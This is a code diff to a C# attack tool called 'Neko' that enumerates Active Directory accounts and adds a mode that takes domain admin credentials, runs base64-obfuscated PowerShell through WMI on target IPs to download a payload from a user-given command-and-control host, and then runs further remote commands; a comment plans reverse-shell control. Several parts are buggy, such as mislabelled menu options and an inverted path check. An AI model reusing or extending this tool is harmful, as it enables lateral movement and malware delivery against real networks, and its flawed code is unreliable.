@@ -30,10 +30,10 @@ namespace Recon
                 Console.WriteLine("Welcome to Neko. \r\n");
 
                 //Prompt user decision on recon or deployment via WMI
-                Console.WriteLine("Options: \r\n\r\n 1: Recon \r\n\r\n 2: Deployment via WMI \r\n");
+                Console.WriteLine("Options: \r\n\r\n 1: Recon \r\n\r\n 2: Installation from C2 via WMI + PowerShell \r\n\r\n 3: Deployment via WMI \r\n");
                 Console.WriteLine("Make your selection:");
                 string attackType = Console.ReadLine();
-                while (attackType != "1" && attackType != "2")
+                while (attackType != "1" && attackType != "2" && attackType != "3")
                 {
                     Console.WriteLine("Invalid selection. Enter '1' for Recon, '2' Deployment via WMI:");
                     attackType = Console.ReadLine();
@@ -140,9 +140,9 @@ namespace Recon
                                 Console.WriteLine(userAccount.LastLogoff);
                                 Console.WriteLine(userAccount.MemberOf);
                                 Console.WriteLine(userAccount.AdminCount);
-                                File.AppendAllText(docPath + "\\results.txt", "SAM Account: " + userAccount.SamAccountName +  Environment.NewLine + "Account SID: " + userAccount.SID + 
-                                    "First Name: " + userAccount.FirstName + Environment.NewLine + "Last Name: " + userAccount.LastName + Environment.NewLine + 
-                                    "Street Address: " + userAccount.StreetAddress + Environment.NewLine + "Director Reports: " + userAccount.DirectReports + Environment.NewLine + 
+                                File.AppendAllText(docPath + "\\results.txt", "SAM Account: " + userAccount.SamAccountName + Environment.NewLine + "Account SID: " + userAccount.SID +
+                                    "First Name: " + userAccount.FirstName + Environment.NewLine + "Last Name: " + userAccount.LastName + Environment.NewLine +
+                                    "Street Address: " + userAccount.StreetAddress + Environment.NewLine + "Director Reports: " + userAccount.DirectReports + Environment.NewLine +
                                     "Last Logon: " + userAccount.LastLogon + Environment.NewLine + "Last Logoff: " + userAccount.LastLogoff + Environment.NewLine + "Member of: " +
                                     userAccount.MemberOf + Environment.NewLine + "Admin Count: " + userAccount.AdminCount);
                             }
@@ -154,7 +154,7 @@ namespace Recon
                                 Console.WriteLine(computer.ComputerInfo);
                                 Console.WriteLine(computer.lastLogon);
                                 //Adds last logon for found computers
-                                File.AppendAllText(docPath + "\\results.txt", "Computer Name: " + computer.ComputerInfo + Environment.NewLine + "Last Logon: " + computer.lastLogon );
+                                File.AppendAllText(docPath + "\\results.txt", "Computer Name: " + computer.ComputerInfo + Environment.NewLine + "Last Logon: " + computer.lastLogon);
                             }
 
                         }
@@ -294,18 +294,17 @@ namespace Recon
                         }
                     }
                 }
-                //User choice to deploy via WMI
+                //Installation of payload via PowerShell + WMI with obfuscation options
                 else if (attackType == "2")
                 {
-                    //Confirm that this is correct
                     Console.WriteLine("\r\n" +
-                        "Drop payload or create processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
+                        "Install payload on selected WMI targets via PowerShell? Enter 'y' or 'n' or 'exit':");
                     string targetWmi = Console.ReadLine();
-
+                    //Confirm that user wants to do this action
                     while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
                     {
                         Console.WriteLine("\r\n" +
-                            "Invalid command. Drop payload or create processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
+                            "Install payload on selected WMI targets via PowerShell? Enter 'y' or 'n' or 'exit':");
                         targetWmi = Console.ReadLine();
                     }
                     if (targetWmi == "y")
@@ -357,12 +356,129 @@ namespace Recon
                                 "Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
                             //Get command from user
                             commandFile = Console.ReadLine();
-                            //Need to add - options for deploying payload from local machine and installing it on the targets' admin$ or c$
+                            
 
                             // Attack targets
                             foreach (string target in ipSplit)
                             {
                                 AttackWMI(wmiUsername, wmiPassword, domainURL, target, commandFile);
+                            }
+
+                        }
+                    }
+                }
+                //User choice to deploy via WMI
+                else if (attackType == "3")
+                {
+                    //Confirm that this is correct
+                    Console.WriteLine("\r\n" +
+                        "Launch payload or create other processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
+                    string targetWmi = Console.ReadLine();
+
+                    while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
+                    {
+                        Console.WriteLine("\r\n" +
+                            "Invalid command. Launch payload or create other processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
+                        targetWmi = Console.ReadLine();
+                    }
+                    if (targetWmi == "y")
+                    {
+                        //Check that user has domain admin creds
+                        Console.WriteLine("\r\n This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
+                        string hasDomain = Console.ReadLine();
+                        while (hasDomain != "y" && hasDomain != "n")
+                        {
+                            Console.WriteLine("\r\n" +
+                                "Invalid selection. This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
+                            hasDomain = Console.ReadLine();
+                        }
+                        if (hasDomain == "y")
+                        {
+                            //Tell user their domain and confirm that this is the intended domain
+                            Console.WriteLine("\r\n" +
+                                "Your domain is: " + domainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
+                            string domainConfirmation = Console.ReadLine();
+                            while (domainConfirmation != "y" && domainConfirmation != "n")
+                            {
+                                Console.WriteLine("Invalid selection. Your domain is: " + domainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
+                                domainConfirmation = Console.ReadLine();
+                            }
+                            if (domainConfirmation == "n")
+                            {
+                                Console.WriteLine("Please enter new domain to use:");
+                                domainURL = Console.ReadLine();
+                            }
+                            //Get Username
+                            Console.WriteLine("Enter user name:");
+                            string wmiUsername = Console.ReadLine();
+                            //Password
+                            Console.WriteLine("Enter password:");
+                            string wmiPassword = Console.ReadLine();
+
+                            //Get target list
+                            Console.WriteLine("\r\n" +
+                                "Enter IP addresses separated by commas:");
+                            //Get IP targets
+                            string ipTargets = Console.ReadLine();
+
+                            //Split into array by commas
+                            string[] ipSplit = ipTargets.Split(',');
+
+                            //Declare command
+                            string commandFile = "";
+
+                            //Get website for payload
+                            Console.WriteLine("\r\n" +
+                                "Enter the domain or IP for your payload:");
+                            string payloadURL = Console.ReadLine();
+
+                            //Choose download path
+                            Console.WriteLine("\r\n" + "Choose download location (leave blank for default path of C:\\ProgramData):");
+                            string downloadPath = Console.ReadLine();
+                            if(downloadPath != "")
+                            {
+                                downloadPath = @"C:\ProgramData";
+                            }
+
+                            //Choose FileName
+                            Console.WriteLine("\r\n + Choose file name for download:");
+                            string fileName = Console.ReadLine();
+
+                            Console.WriteLine("Encoding commands for obfuscation");
+                            string concattedCommand = "Invoke-WebRequest -Uri '" + payloadURL + "'" + "-UseBasicParsing -OutFile " + downloadPath + "\\" + fileName;
+
+                            byte[] encoded = Encoding.Unicode.GetBytes(concattedCommand);
+                            string obfuscatedCommand = Convert.ToBase64String(encoded);
+
+                            //Get command from user
+                            commandFile = "cmd.exe /c powershell -noninteractive -noprofile -encodedcommand " + obfuscatedCommand;
+                            //Need to add - options for deploying payload from local machine and installing it on the targets' admin$ or c$; as well as reverse TCP Shell control
+
+                            // Attack targets
+                            foreach (string target in ipSplit)
+                            {
+                                AttackWMI(wmiUsername, wmiPassword, domainURL, target, commandFile);
+                            }
+
+                            //Check if user wants to launch additional commands after payload installation
+                            Console.WriteLine("Would you like to launch additional commands? Enter 'y' or 'n':");
+                            string additionalCommands = Console.ReadLine();
+                            while(additionalCommands != "y" && additionalCommands != "n")
+                            {
+                                Console.WriteLine("Invalid selection. Would you like to launch additional commands? Enter 'y' or 'n':");
+                            }
+                            if (additionalCommands == "y")
+                            {
+                                Console.WriteLine("Please enter additional commands, for instance, launching your payload with cmd.exe");
+                                string additionalCommandLine = Console.ReadLine();
+
+                                //Launching additional commands
+                                Console.WriteLine("Executing additional commands: " + additionalCommandLine);
+                                // Additional commands to attack targets
+                                foreach (string target in ipSplit)
+                                {
+                                    AttackWMI(wmiUsername, wmiPassword, domainURL, target, additionalCommandLine);
+                                }
                             }
                         }
                     }
